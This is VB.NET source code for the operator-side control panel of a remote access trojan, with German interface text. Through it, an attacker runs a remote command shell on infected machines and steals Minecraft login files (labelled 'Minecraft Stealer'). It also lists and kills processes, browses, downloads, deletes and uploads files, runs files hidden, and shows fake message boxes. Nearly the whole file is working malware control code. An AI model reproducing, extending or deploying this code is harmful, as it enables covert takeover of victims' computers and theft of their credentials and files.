Imports System.Net.Sockets
Imports System.IO

Public Class Controll
    'Inherits Form

    Public Number As Integer = 0
    Public Connection As Form1.TrojanerBase
    Public cmd_client As TcpClient
    Public port As Integer

    Structure FolderFileDia
        Public Name As String
        Public File As Boolean
        Public Folder As Boolean
    End Structure

    Public FolderFileD As New List(Of FolderFileDia)

    Private Sub Controll_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'My.Computer.Audio.Play(My.Resources.untitled, AudioPlayMode.Background)
        Me.Text = "Client Number: " & Number
        Connection.w.WriteLine("land")
        Connection.w.Flush()
        Dim land As String = Connection.r.ReadLine()
        Label1.Text = "Land: " & land
        'MsgBox("hiho" & MsgBoxStyle.Critical, MsgBoxStyle.Critical, "")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub TabPage1_Paint(sender As Object, e As PaintEventArgs) Handles TabPage1.Paint
        Connection.w.WriteLine("otherinfos")
        Connection.w.Flush()
        Dim gett As String = Connection.r.ReadLine()
        Dim platform As String = b(gett.Split("|")(0))
        Dim version As String = b(gett.Split("|")(1))
        Dim pmemory As String = b(gett.Split("|")(2))
        Dim vmemory As String = b(gett.Split("|")(3))
        Dim DeviceName As String = b(gett.Split("|")(4))
        Dim Hardwareid As String = b(gett.Split("|")(5))
        Dim osname As String = b(gett.Split("|")(6))
        RichTextBox1.Text = "OsFullname: " & osname & vbNewLine & "OsPlatform: " & platform & vbNewLine & "OSVersion: " & version & vbNewLine & "PhysikMomery: " & pmemory & vbNewLine & "VirtualMemory: " & vmemory & vbNewLine & "DeviceName: " & DeviceName & vbNewLine & "HardwareID: " & Hardwareid & vbNewLine & vbNewLine & "Thsi is a Modder Programm ;)"
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim status As Integer = 16
        If ComboBox1.Text = "Critical" Then
            status = MsgBoxStyle.Critical
        ElseIf ComboBox1.Text = "Information" Then
            status = MsgBoxStyle.Information
        ElseIf ComboBox1.Text = "Exclamation" Then
            status = MsgBoxStyle.Exclamation
        ElseIf ComboBox1.Text = "YesNo" Then
            status = MsgBoxStyle.YesNo
        ElseIf ComboBox1.Text = "YesNoCancel" Then
            status = MsgBoxStyle.YesNoCancel
        End If
        MsgBox(RichTextBox2.Text, status, TextBox1.Text)
    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        Dim status As Integer = 16
        If ComboBox1.Text = "Critical" Then
            status = MsgBoxStyle.Critical
        ElseIf ComboBox1.Text = "Information" Then
            status = MsgBoxStyle.Information
        ElseIf ComboBox1.Text = "Exclamation" Then
            status = MsgBoxStyle.Exclamation
        ElseIf ComboBox1.Text = "YesNo" Then
            status = MsgBoxStyle.YesNo
        ElseIf ComboBox1.Text = "YesNoCancel" Then
            status = MsgBoxStyle.YesNoCancel
        End If
        Dim comiled As String = "MSGBOX|" & status & "|" & TextBox1.Text.Replace("|", "<strich>") & "|" & RichTextBox2.Text.Replace("|", "<strich>")
        Connection.w.WriteLine(comiled)
        Connection.w.Flush()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        port = TextBox2.Text
        BackgroundWorker1.RunWorkerAsync()
        Connection.w.WriteLine("STARTCMD|" & TextBox2.Text)
        Connection.w.Flush()
    End Sub
    Public endd As Boolean = False
    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Dim l As New TcpListener(port)
        l.Start()
        cmd_client = l.AcceptTcpClient
        Dim w As New IO.StreamWriter(cmd_client.GetStream)
        Dim r As New IO.StreamReader(cmd_client.GetStream)
        While endd <> True
            Try
                Dim s As String = r.ReadLine()
                Me.Invoke(New dg_writeText(AddressOf writeTEXT), s)
            Catch ex As Exception
            End Try
        End While
        l.Stop()
        endd = False
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs)

    End Sub

    Delegate Sub dg_writeText(ByVal text As String)
    Sub writeTEXT(ByVal text As String)
        RichTextBox3.AppendText(text & vbNewLine)
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Connection.w.WriteLine("CMDSHELL|" & TextBox3.Text.Replace("|", "<strich>"))
        Connection.w.Flush()
    End Sub

    Public Function c(ByVal text As String) As String
        Return text.Replace("|", "<strich>")
    End Function

    Public Function b(ByVal text As String) As String
        Return text.Replace("<strich>", "|")
    End Function

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        endd = True
    End Sub

    Private Sub Button6_Click_1(sender As Object, e As EventArgs) Handles Button6.Click
        Dim sf As New SaveFileDialog
        sf.Filter = "All Files (*.*)|*"
        sf.Title = "Minecraft Stealer - Bitte geben sie den Ordner an"
        If sf.ShowDialog = Windows.Forms.DialogResult.OK Then
            Connection.w.WriteLine("stealmc")
            Connection.w.Flush()
            Dim lastlogindata As String = Connection.r.ReadLine()
            'MsgBox(lastlogindata, MsgBoxStyle.Critical, "")
            Dim vByteBuffer(lastlogindata.Length + 1) As Byte
            Dim vHexChar As String = String.Empty
            For i As Integer = 0 To (lastlogindata.Length - 1) Step 2
                vHexChar = lastlogindata(i) & lastlogindata(i + 1)
                vByteBuffer(i / 2) = Byte.Parse(vHexChar, Globalization.NumberStyles.HexNumber)
            Next
            Using vFs As New FileStream(sf.FileName, FileMode.Create)
                vFs.Write(vByteBuffer, 0, vByteBuffer.Length)
            End Using
        Else
            MsgBox("Sie haben der Vorgang Abgebrochen", MsgBoxStyle.Information, "Manual")
        End If
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Connection.w.WriteLine("mcremovejar")
        Connection.w.Flush()
    End Sub

    Private Sub TabPage4_Paint(sender As Object, e As EventArgs) Handles Button9.Click
        ListView2.Items.Clear()
        Connection.w.WriteLine("gettask")
        Connection.w.Flush()
        Dim request As String() = Connection.r.ReadLine().Split("|")
        For Each p_name As String In request
            ListView2.Items.Add(p_name)
        Next
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Try
            MsgBox("Der Task """ & ListView2.SelectedItems.Item(0).Text.ToString() & """ wird beendet!", MsgBoxStyle.Information, "Informationnen")
            Connection.w.WriteLine("endtask|" & ListView2.SelectedItems.Item(0).Text.ToString())
            Connection.w.Flush()
        Catch ex As Exception

        End Try
        'If ListBox1.SelectedItem.ToString() Then
        'MsgBox("endtask|" & ListBox1.SelectedItem.ToString())
        'Connection.w.WriteLine("endtask|" & ListBox1.SelectedItem(0))
        'Connection.w.Flush()
        'End If

    End Sub

    Private Sub Button10_Click() Handles Button10.Click
        ListView1.Items.Clear()
        ListView1.Items.Add("..").ImageIndex = 5
        FolderFileD.RemoveRange(0, FolderFileD.Count)
        Connection.w.WriteLine("get|" & TextBox4.Text)
        Connection.w.Flush()
        Dim request As String() = Connection.r.ReadLine().Split("~")
        Dim folder As String() = request(0).Split("|")
        Dim files As String() = request(1).Split("|")
        For Each s As String In folder
            If s = "" Then
            Else
                ListView1.Items.Add(s).ImageIndex = 5
                Dim ffd As New FolderFileDia
                ffd.Name = s
                ffd.File = False
                ffd.Folder = True
                FolderFileD.Add(ffd)
            End If
        Next
        ListView1.Items.Add(" ")
        For Each s As String In files
            If s = "" Then
            Else
                If s.EndsWith(".exe") Or s.EndsWith(".msi") Then
                    ListView1.Items.Add(s).ImageIndex = 7
                ElseIf s.EndsWith(".dll") Then
                    ListView1.Items.Add(s).ImageIndex = 8
                ElseIf s.EndsWith(".rar") Or s.EndsWith(".zip") Or s.EndsWith(".7z") Then
                    ListView1.Items.Add(s).ImageIndex = 9
                ElseIf s.EndsWith(".jar") Then
                    ListView1.Items.Add(s).ImageIndex = 10
                Else
                    ListView1.Items.Add(s).ImageIndex = 6
                End If
                Dim ffd As New FolderFileDia
                ffd.Name = s
                ffd.File = True
                ffd.Folder = False
                FolderFileD.Add(ffd)
            End If
        Next

    End Sub

    Private Sub ListView1_DoubleClick(sender As Object, e As EventArgs) Handles ListView1.DoubleClick
        Try
            If ListView1.SelectedItems.Item(0).Text.ToString() = ".." Then
                Dim s As String() = TextBox4.Text.Split("\")
                Dim erg As String = ""
                For i As Integer = 0 To s.Length - 2
                    If i = s.Length - 2 Then
                        erg = erg & s(i)
                    Else
                        erg = erg & s(i) & "\"
                    End If

                Next
                If erg = "C:" Then
                    erg = erg & "\"
                End If
                TextBox4.Text = erg
                Button10_Click()
            Else
                Dim isfile As Boolean = False
                Dim isfolder As Boolean = False
                For Each ffd As FolderFileDia In FolderFileD
                    If ffd.Name = ListView1.SelectedItems.Item(0).Text.ToString() Then
                        isfile = ffd.File
                        isfolder = ffd.Folder
                    End If
                Next
                If isfolder = True Then
                    TextBox4.Text = ListView1.SelectedItems.Item(0).Text.ToString()
                    Button10_Click()
                End If
            End If

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Button10_Click()
    End Sub

    Private Sub ListView1_MouseClick(sender As Object, e As MouseEventArgs) Handles ListView1.MouseClick
        If e.Button = Windows.Forms.MouseButtons.Right Then
            If ListView1.SelectedItems.Item(0).Text.ToString() = ".." Then

            Else
                Dim isfile As Boolean = False
                Dim isfolder As Boolean = False
                For Each ffd As FolderFileDia In FolderFileD
                    If ffd.Name = ListView1.SelectedItems.Item(0).Text.ToString() Then
                        isfile = ffd.File
                        isfolder = ffd.Folder
                    End If
                Next
                If isfolder = True Then
                    ContextMenuStrip2.Height = Control.MousePosition.Y.ToString
                    ContextMenuStrip2.Width = Control.MousePosition.X.ToString
                    ContextMenuStrip2.Show(ListView1, New Drawing.Point(e.X.ToString, e.Y.ToString))
                Else
                    If ListView1.SelectedItems.Item(0).Text.ToString().EndsWith(".exe") Or ListView1.SelectedItems.Item(0).Text.ToString().EndsWith(".msi") Then
                        ContextMenuStrip3.Height = Control.MousePosition.Y.ToString
                        ContextMenuStrip3.Width = Control.MousePosition.X.ToString
                        ContextMenuStrip3.Show(ListView1, New Drawing.Point(e.X.ToString, e.Y.ToString))
                    Else
                        ContextMenuStrip1.Height = Control.MousePosition.Y.ToString
                        ContextMenuStrip1.Width = Control.MousePosition.X.ToString
                        ContextMenuStrip1.Show(ListView1, New Drawing.Point(e.X.ToString, e.Y.ToString))
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub ListView1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListView1.MouseDoubleClick
        Try
            If ListView1.SelectedItems.Item(0).Text.ToString() = ".." Then

            Else
                Dim isfile As Boolean = False
                Dim isfolder As Boolean = False
                For Each ffd As FolderFileDia In FolderFileD
                    If ffd.Name = ListView1.SelectedItems.Item(0).Text.ToString() Then
                        isfile = ffd.File
                        isfolder = ffd.Folder
                    End If
                Next
                If isfolder = True Then

                Else
                    If ListView1.SelectedItems.Item(0).Text.ToString().EndsWith(".exe") Or ListView1.SelectedItems.Item(0).Text.ToString().EndsWith(".msi") Then
                        ContextMenuStrip3.Height = Control.MousePosition.Y.ToString
                        ContextMenuStrip3.Width = Control.MousePosition.X.ToString
                        ContextMenuStrip3.Show(ListView1, New Drawing.Point(e.X.ToString, e.Y.ToString))
                    Else
                        ContextMenuStrip1.Height = Control.MousePosition.Y.ToString
                        ContextMenuStrip1.Width = Control.MousePosition.X.ToString
                        ContextMenuStrip1.Show(ListView1, New Drawing.Point(e.X.ToString, e.Y.ToString))
                    End If
                    
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DeleteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFileToolStripMenuItem.Click
        Connection.w.WriteLine("removefile|" & ListView1.SelectedItems.Item(0).Text.ToString())
        Connection.w.Flush()
        Button10_Click()
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        Dim sf As New SaveFileDialog
        Dim s As String() = ListView1.SelectedItems.Item(0).Text.ToString().Split(".")
        sf.Filter = "File |*." & s(s.Length - 1)
        sf.Title = "Explorer Downloader - Bitte geben sie den Ordner an"
        If sf.ShowDialog = Windows.Forms.DialogResult.OK Then
            Connection.w.WriteLine("downloadfile|" & ListView1.SelectedItems.Item(0).Text.ToString())
            Connection.w.Flush()
            'Dim lastlogindata() As Byte = Connection.r.Read()
            Dim networkStream As NetworkStream = Connection.client.GetStream()
            Dim bytes(Connection.client.ReceiveBufferSize) As Byte
            networkStream.Read(bytes, 0, CInt(Connection.client.ReceiveBufferSize))
            IO.File.WriteAllBytes(sf.FileName, bytes)
            'MsgBox(lastlogindata, MsgBoxStyle.Critical, "")
            'Dim vByteBuffer(lastlogindata.Length + 1) As Byte
            'Dim vHexChar As String = String.Empty
            'For i As Integer = 0 To (lastlogindata.Length - 1) Step 2
            'vHexChar = lastlogindata(i) & lastlogindata(i + 1)
            'vByteBuffer(i / 2) = Byte.Parse(vHexChar, Globalization.NumberStyles.HexNumber)
            'Next
            'Using vFs As New FileStream(sf.FileName, FileMode.Create)
            'vFs.Write(vByteBuffer, 0, vByteBuffer.Length)
            'End Using

        Else
            MsgBox("Sie haben der Vorgang Abgebrochen", MsgBoxStyle.Information, "Manual")
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        OpenFolderToolStripMenuItem_Click(sender, e)
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        DeleteFileToolStripMenuItem_Click(sender, e)
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        Connection.w.WriteLine("runfilenormal|" & ListView1.SelectedItems.Item(0).Text.ToString())
        Connection.w.Flush()
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        Connection.w.WriteLine("runfilehidden|" & ListView1.SelectedItems.Item(0).Text.ToString())
        Connection.w.Flush()
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem.Click
        Dim ofile As New OpenFileDialog
        ofile.Title = "Select a File for Upload"
        If ofile.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
            Dim lastlogindata As String
            If System.IO.File.Exists(lastlogin) = True Then
                Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
                    Dim value As Integer = file.ReadByte()
                    Do Until value = -1
                        lastlogindata = lastlogindata & value.ToString("X2")

                        value = file.ReadByte()
                    Loop
                End Using
            End If
            Connection.w.WriteLine("uploadfile|" & TextBox4.Text & "\" & InputBox("Geben sie einen Filename an (hack.exe)", "Filename", ""))
            Connection.w.Flush()
            Threading.Thread.Sleep(500)
            Connection.w.WriteLine(lastlogin)
            Connection.w.Flush()
        Else
            MsgBox("Sie haben die Aktion abgebrochen", MsgBoxStyle.Information, "Manual")
        End If
    End Sub

    Private Sub UploadInCurretFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadInCurretFolderToolStripMenuItem.Click
        Dim ofile As New OpenFileDialog
        ofile.Title = "Select a File for Upload"
        If ofile.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
            Dim lastlogindata As String
            If System.IO.File.Exists(lastlogin) = True Then
                Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
                    Dim value As Integer = file.ReadByte()
                    Do Until value = -1
                        lastlogindata = lastlogindata & value.ToString("X2")

                        value = file.ReadByte()
                    Loop
                End Using
            End If
            Connection.w.WriteLine("uploadfile|" & TextBox4.Text & "\" & InputBox("Geben sie einen Filename an (hack.exe)", "Filename", ""))
            Connection.w.Flush()
            Threading.Thread.Sleep(500)
            Connection.w.WriteLine(lastlogin)
            Connection.w.Flush()
        Else
            MsgBox("Sie haben die Aktion abgebrochen", MsgBoxStyle.Information, "Manual")
        End If
    End Sub
End Class